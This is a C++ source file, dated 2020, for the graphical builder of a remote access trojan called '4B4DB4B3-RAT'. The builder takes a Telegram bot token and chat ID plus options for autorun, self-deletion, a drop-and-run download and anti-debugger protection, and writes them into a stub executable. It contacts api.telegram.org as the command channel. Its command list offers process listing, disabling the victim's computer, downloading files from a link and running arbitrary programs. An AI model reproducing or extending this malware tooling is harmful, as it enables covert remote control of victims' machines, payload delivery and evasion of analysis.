/*
4B4DB4B3 (c) 2020
15.10.2020
*/

#include "DlgProc.h"
#include "Builder.h"
#include "Requests.h"

#include "resource.h"

HWND hWndDlg;
HBRUSH brDlg = CreateSolidBrush(RGB(37, 37, 38));

INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	hWndDlg = hWnd;
	switch (uMsg) {
		case WM_CTLCOLORDLG:
			return (UINT)brDlg;

		case WM_CTLCOLORSTATIC:
		{
			HDC dcStatic = (HDC)wParam;

			SetTextColor(dcStatic, RGB(255, 255, 255));
			SetBkMode(dcStatic, TRANSPARENT);

			return (UINT)brDlg;
		}

		case WM_CTLCOLOREDIT:
		{
			HDC dcEdit = (HDC)wParam;

			SetTextColor(dcEdit, RGB(255, 255, 255));
			SetBkMode(dcEdit, TRANSPARENT);

			return (UINT)brDlg;
		}

		case WM_LBUTTONDOWN:
		{
			SendMessage(hWnd, WM_NCLBUTTONDOWN, HTCAPTION, 0);
			return 0;
		}

		case WM_COMMAND:
		{
			switch (LOWORD(wParam)) {
				case IDC_STATIC1:
				{
					ExitProcess(0);
					return 0;
				}
				case IDC_STATIC2:
				{
					ShowWindow(hWnd, SW_MINIMIZE);
					return 0;
				}
				case IDC_STATIC3:
				{
					Settings s;
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), s.botapi, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), s.chatid, 127);

					INT TextLen = GetWindowTextLengthA(GetDlgItem(hWnd, IDC_EDIT3)) + 1;
					char* buff = new char[TextLen];
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT3), buff, TextLen);

					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT4), s.drop, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT5), s.client_delay, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT6), s.autorun, 127);

					UINT State = SendMessage(GetDlgItem(hWnd, IDC_CHECK1), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.auto_delete = true;
					}
					else {
						s.auto_delete = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK2), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.autorun_state = true;
					}
					else {
						s.autorun_state = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK3), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.drop_run = true;
					}
					else {
						s.drop_run = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK4), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.protect_debuggers = true;
					}
					else {
						s.protect_debuggers = false;
					}

					if (!MakeFile("Stub.exe", buff, &s)) {
						MessageBoxA(NULL, "Error! Maybe, stub not found?", "ERROR", MB_OK | MB_ICONERROR);
					}
					else {
						MessageBoxA(NULL, "Success!", "BUILDER", MB_OK | MB_ICONINFORMATION);
					}

					delete[] buff;
					return 0;
				}
				case IDC_STATIC4:
				{
					char api[128], chatid[128];
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), api, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), chatid, 127);

					std::string response;
					
					std::string path = "bot" + std::string(api) + "/getUpdates";
					response = GetRequest("api.telegram.org", "4B4DB4B3", path.c_str());

					std::string text = "Hello! 4B4DB4B3-RAT was activated!%0A"
						"%0A"
						"Commands: %0A"
						"/user[ID] processes - get process list %0A"
						"/user[ID] disable pc - disable computer of user %0A"
						"/user[ID] close - close rat %0A"
						"/user[ID] loader [LINK] [PATH] - upload file from [LINK] to [PATH] %0A"
						"/user[ID] run [PATH] [ARGS] - run file from [PATH] with arguments [ARGS]%0A"
						
						"/online - get users online";
					path = "bot" + std::string(api) + "/sendMessage?chat_id=" + std::string(chatid) + "&text=" + text;

					MessageBoxA(NULL, response.c_str(), chatid, MB_OK | MB_ICONINFORMATION);
					return 0;
				}
			}
			return 0;
		}

		case WM_DESTROY:
		{
			EndDialog(hWnd, 0);
			return 0;
		}
	}
	return 0;
}